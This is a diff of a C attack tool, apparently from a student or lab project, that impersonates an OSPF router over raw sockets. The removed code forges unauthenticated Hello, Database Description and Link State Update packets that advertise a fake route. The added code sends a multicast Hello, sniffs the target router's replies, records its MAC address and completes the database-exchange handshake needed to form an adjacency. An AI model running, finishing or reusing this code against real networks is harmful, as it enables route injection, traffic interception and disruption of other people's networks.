@@ -2,177 +2,133 @@
 #include <stdlib.h>
 #include <errno.h>
 #include <string.h>
-#include <sys/types.h>
+#include <arpa/inet.h>
 #include <sys/socket.h>
+#include <sys/types.h>
 #include <linux/if_ether.h>
-#include <netpacket/packet.h>
-#include <net/ethernet.h>
 #include <netinet/ether.h>
 #include <netinet/ip.h>
-#include <arpa/inet.h>
 
-#include "checksum.h"
 #include "ospf.h"
 #include "ospf_attack.h"
 #include "utils.h"
 
-// "Private methods" for the attack, declared here so that we can reference them
-// at any part of this file instead of having to declare the method first
-int ospf_write_header(unsigned char *buffer, char *local_ip, int ospf_len, unsigned char packet_type);
-int ospf_write_hello(unsigned char *buffer, char *router_ip);
-int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_number, __u8 control);
-int ospf_write_ls_update(unsigned char *buffer, char *local_ip, char *router_ip);
-int ospf_write_lss_data_block(unsigned char *buffer);
+int attack_wait_for_db_description(struct attack_env *env);
+void attack_sync_db_desc(struct attack_env *env);
+int attack_send_db_description(struct attack_env *env, __u32 sequence_number, __u8 control);
 
-// Writes an OSPF Hello Packet on the buffer and returns the total amount of
-// bytes that should be sent over the network
-int attack_write_hello(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
-  // Ethernet header
-  unsigned char *dest_mac = parse_mac_addr(IPV4_MULTICAST_MAC);
-  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);
+void attack_establish_adjacency(struct attack_env *env) {
+  int ret_value;
+  fprintf(stderr, "ESTABLISHING ADJACENCY\n");
 
-  // Position on the buffer where we should begin writing OSPF data
-  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
-  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;
+  int packet_len = ospf_multicast_hello(env->buffer, env->local_mac, env->local_ip, env->router_ip);
+  fprintf(stderr, "- Sending multicast hello... ");
+  if((ret_value = send_packet(env->sock_fd, parse_mac_addr(IPV4_MULTICAST_MAC), env->buffer, env->iface_index, packet_len)) < 0) {
+    die("\nFATAL: Error sending Hello packet\n");
+  }
+  fprintf(stderr, "DONE (%d)\n", ret_value);
 
-  // OSPF sections of the packet
-  int ospf_len = 0;
-  ospf_len += ospf_write_hello(ospf_buffer_ptr + sizeof(struct ospf_header), router_ip);
-  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_hello), OSPF_HELLO_T);
-  ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);
+  attack_sync_db_desc(env);
 
-  // IP header
-  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, IPV4_MULTICAST_ADDR, ospf_len);
-
-  return ether_header_len + ip_header_len + ospf_len;
+  printf("TODO: Wait for LS update to my IP and send ack\n");
 }
 
-// Writes an OSPF DB Description Packet on the buffer and returns the total amount
-// of bytes that should be sent over the network
-int attack_write_db_description(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip, __u32 sequence_number, __u8 control) {
-  // Ethernet header
-  unsigned char *dest_mac = parse_mac_addr(ROUTER_MAC);
-  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);
+void attack_sync_db_desc(struct attack_env *env) {
+  int ret_value;
+  unsigned long dd_seq_number = 10000;
 
-  // Position on the buffer where we should begin writing OSPF data
-  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
-  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;
+  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
+    die("Error while waiting for DB description");
+  }
+  // Store the mac address sent by the router
+  struct ether_header *eth_header = (struct ether_header *)env->buffer;
+  env->router_mac = calloc(sizeof(unsigned char), MAC_ADDR_LEN);
+  memcpy(env->router_mac, eth_header->ether_shost, MAC_ADDR_LEN);
+  fprintf(stderr, "- Router MAC set to: %x:%x:%x:%x:%x:%x \n", env->router_mac[0],env->router_mac[1],env->router_mac[2],env->router_mac[3],env->router_mac[4],env->router_mac[5]);
 
-  // OSPF sections of the packet
-  int ospf_len = 0;
-  ospf_len += ospf_write_db_description(ospf_buffer_ptr + sizeof(struct ospf_header), sequence_number, control);
-  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, sizeof(struct ospf_dd), OSPF_DATADESC_T);
-  ospf_len += ospf_write_lss_data_block(ospf_buffer_ptr + ospf_len);
+  fprintf(stderr, "- Sending DB description with INIT, MORE and MASTER/SLAVE... ");
+  attack_send_db_description(env, dd_seq_number, DDC_INIT + DDC_MORE + DDC_MSTR);
+  fprintf(stderr, "DONE (%d)\n", ret_value);
+  dd_seq_number += 1;
 
-  // IP header
-  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, router_ip, ospf_len);
+  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
+    die("Error while waiting for DB description");
+  }
+  struct ospf_dd *db_desc = (struct ospf_dd *)(env->buffer + ret_value);
 
-  return ether_header_len + ip_header_len + ospf_len;
+  while (db_desc->dd_control != 0) {
+    fprintf(stderr, "- MORE flag is set, sending another DB description with MORE and MASTER/SLAVE... ");
+    attack_send_db_description(env, dd_seq_number, DDC_MORE + DDC_MSTR);
+    fprintf(stderr, "DONE (%d)\n", ret_value);
+    dd_seq_number += 1;
+
+    if ((ret_value = attack_wait_for_db_description(env)) < 0) {
+      die("Error while waiting for DB description");
+    }
+    db_desc = (struct ospf_dd *)(env->buffer + ret_value);
+  }
+
+  fprintf(stderr, "- Sending the last DB description with the MASTER/SLAVE flag set... ");
+  attack_send_db_description(env, dd_seq_number, DDC_MSTR);
+  fprintf(stderr, "DONE (%d)\n", ret_value);
+  dd_seq_number += 1;
+
+  if ((ret_value = attack_wait_for_db_description(env)) < 0) {
+    die("Error while waiting for DB description");
+  }
+  db_desc = (struct ospf_dd *)(env->buffer + ret_value);
+  if (db_desc->dd_control != 0) {
+    die("Unexpected DB description message received");
+  }
 }
 
-int attack_write_ls_update(unsigned char buffer[BUFFER_LEN], unsigned char *local_mac, char *local_ip, char *router_ip) {
-  // Ethernet header
-  unsigned char *dest_mac = parse_mac_addr(ROUTER_MAC);
-  int ether_header_len = write_ipv4_ethernet_header(buffer, local_mac, dest_mac);
+int attack_wait_for_db_description(struct attack_env *env) {
+  struct ip *ip_header;
+  struct ether_header *eth_header;
+  struct ospf_header *ospf_header;
 
-  // Position on the buffer where we should begin writing OSPF data
-  int ospf_packet_offset = ether_header_len + sizeof(struct ip);
-  unsigned char *ospf_buffer_ptr = buffer + ospf_packet_offset;
+  fprintf(stderr, "- Waiting for DB description...");
+  while (1) {
+    if (recv(env->sock_fd, (char *)env->buffer, sizeof(env->buffer), 0x0) < 0) {
+      printf("RECV on OSPF Hello...\n");
+      // If an error occured, check if it was a timeout and try again
+      if (errno == EAGAIN || errno == EWOULDBLOCK) {
+        continue;
+      } else {
+        die("Unknown error while reading from socket");
+      }
+    }
+    fprintf(stderr, ".");
 
-  // OSPF sections of the packet
-  int ospf_len = 0;
-  ospf_len += ospf_write_ls_update(ospf_buffer_ptr + sizeof(struct ospf_header), local_ip, router_ip);
-  ospf_len += ospf_write_header(ospf_buffer_ptr, local_ip, ospf_len, OSPF_LSUPDATE_T);
+    unsigned char *buffer_ptr = env->buffer;
 
-  // IP header
-  int ip_header_len = write_ipv4_header(buffer + ether_header_len, local_ip, router_ip, ospf_len);
+    eth_header = (struct ether_header *)buffer_ptr;
+    if (eth_header->ether_type != htons(0x0800)) continue;
+    buffer_ptr += sizeof(struct ether_header);
 
-  return ether_header_len + ip_header_len + ospf_len;
+    ip_header = (struct ip *)buffer_ptr;
+    if (ip_header->ip_p != PROTO_OSPF) continue;
+    buffer_ptr += ip_header->ip_hl * 4;
+
+    ospf_header = (struct ospf_header *)buffer_ptr;
+    if (ospf_header->ospf_type != OSPF_DATADESC_T) continue;
+
+    // Is it a message from the router?
+    if (((__u32)ip_header->ip_src.s_addr) != inet_addr(env->router_ip)) continue;
+
+    // Is it a message for me?
+    if (ip_header->ip_dst.s_addr != inet_addr(env->local_ip)) continue;
+
+    fprintf(stderr, " CAPTURED\n");
+
+    break;
+  }
+  return sizeof(struct ether_header) + ip_header->ip_hl * 4 + sizeof(struct ospf_header);
 }
 
-/******************************************************************************
- * Methods for building parts of OSPF packets
- ******************************************************************************/
-
-int ospf_write_header(unsigned char *buffer, char *local_ip, int ospf_data_len, unsigned char packet_type) {
-  int total_len = ospf_data_len + sizeof(struct ospf_header);
-
-  struct ospf_header *header = (struct ospf_header *) buffer;
-  header->ospf_version = OSPF_VERSION;       /* Version Number       */
-  header->ospf_type = packet_type;           /* Packet Type          */
-  header->ospf_len = htons(total_len);       /* Packet Length        */
-  header->ospf_rid = inet_addr(local_ip);    /* Router Identifier    */
-  header->ospf_aid = inet_addr("0.0.0.0");   /* Area Identifier      */
-  header->ospf_cksum = 0x0000;               /* Check Sum            */
-  header->ospf_authtype = AU_NONE;           /* Authentication Type  */
-  header->ospf_auth = 0;                     /* Authentication Field */
-
-  header->ospf_cksum = in_cksum((short unsigned int *)buffer, total_len);
-
-  return sizeof(struct ospf_header);
-}
-
-int ospf_write_hello(unsigned char *buffer, char *router_ip) {
-  struct ospf_hello *hello = (struct ospf_hello *) buffer;
-  hello->oh_netmask = inet_addr("255.255.255.0"); /* Network Mask     */
-  hello->oh_hintv = OSPF_HELLO_INTERVAL;          /* Hello Interval (seconds) */
-  hello->oh_opts = OSPF_HELLO_OPTIONS;            /* Options      */
-  hello->oh_prio = OSPF_HELLO_PRIORITY;           /* Sender's Router Priority */
-  hello->oh_rdintv = inet_addr("0.0.0.40");       /* Seconds Before Declare Dead  */
-  hello->oh_drid = inet_addr(router_ip);          /* Designated Router ID   */
-  hello->oh_brid = inet_addr("0.0.0.0");          /* Backup Designated Router ID  */
-  hello->oh_neighbor = inet_addr(router_ip);      /* Living Neighbors   */
-
-  return sizeof(struct ospf_hello);
-}
-
-int ospf_write_db_description(unsigned char* buffer, unsigned long sequence_number, __u8 control) {
-  struct ospf_dd *database_description_header_ospf = (struct ospf_dd *) buffer;
-  database_description_header_ospf->dd_mbz = htons(1500);                   /* Must Be Zero         */
-  database_description_header_ospf->dd_opts = DD_OPTIONS;                   /* Options          */
-  database_description_header_ospf->dd_control = control;                   /* Control Bits (DDC_* below)   */
-  database_description_header_ospf->dd_seq = htonl(sequence_number);        /* Sequence Number      */
-
-  return sizeof(struct ospf_dd);
-}
-
-int ospf_write_ls_update(unsigned char *buffer, char *local_ip, char *router_ip) {
-  int length = 0;
-  // OSPF Link State Update
-  struct ospf_lsu *lsu_header_ospf = (struct ospf_lsu *) buffer;
-  lsu_header_ospf->lsu_nads = htonl(1); /* # Advertisments This Packet  */
-  length += sizeof(struct ospf_lsu);
-
-  // OSPF link state summary header
-  struct ospf_lss *lss_header_ospf = (struct ospf_lss *) (buffer + length);
-  lss_header_ospf->lss_age = htons(LSS_AGE);                                /* Time (secs) Since Originated */
-  lss_header_ospf->lss_opts = LSS_OPTIONS;                                  /* Options Supported */
-  lss_header_ospf->lss_type = LSST_ROUTE;                                   /* LST_* below ?pedro */
-  lss_header_ospf->lss_lsid = inet_addr("192.168.3.0");                     /* Link State Identifier */
-  lss_header_ospf->lss_rid = inet_addr(local_ip);                           /* Advertising Router Identifier ?pedro I think would was THE PHANTOM ROUTER*/
-  lss_header_ospf->lss_seq = LSS_SEQ_NUM;                                   /* Link State Adv. Sequence #   */
-  lss_header_ospf->lss_cksum = 0x0000;                                      /* Fletcher Checksum of LSA */
-  lss_header_ospf->lss_len = LSS_LENGTH;                                    /* Length of Advertisement ?pedro I don't know, because in wireshark a header has 3 LSS and values not equal*/
-  length += sizeof(struct ospf_lss);
-
-  // OSPF Network Links Advertisement
-  struct  ospf_na *na_header_ospf = (struct ospf_na *) (buffer + length);
-  na_header_ospf->na_mask = inet_addr("255.255.255.0");                   /* Network Mask     */
-  na_header_ospf->na_rid[0] = inet_addr(local_ip);                       /* ID of first  Attached Routers  */
-  na_header_ospf->na_rid[1] = inet_addr(router_ip);                       /* ID of second Attached Routers  */
-  length += sizeof(struct ospf_na);
-
-  // lss_header_ospf->lss_cksum = fletcher_checksum((short unsigned int *)buffer + 6, length, 0);
-  fletcher_checksum((short unsigned int *)buffer + sizeof(struct ospf_lsu) + 2, sizeof(struct ospf_na) + sizeof(struct ospf_lss) - 2, 9);
-
-  return length;
-}
-
-int ospf_write_lss_data_block(unsigned char *buffer) {
-  struct ospf_lls *lls_header_ospf = (struct ospf_lls *) buffer;
-  lls_header_ospf->data[0] = 0x0300f6ff;
-  lls_header_ospf->data[1] = 0x04000100;
-  lls_header_ospf->data[2] = 0x01000000;
-
-  return sizeof(struct ospf_lls);
+int attack_send_db_description(struct attack_env *env, __u32 sequence_number, __u8 control) {
+  int packet_len = ospf_db_description(env->buffer, env->local_mac, env->local_ip, env->router_mac, env->router_ip, sequence_number, control);
+  if (send_packet(env->sock_fd, env->router_mac, env->buffer, env->iface_index, packet_len) < 0) {
+    die("\nFATAL: Error sending DB description packet\n");
+  }
 }
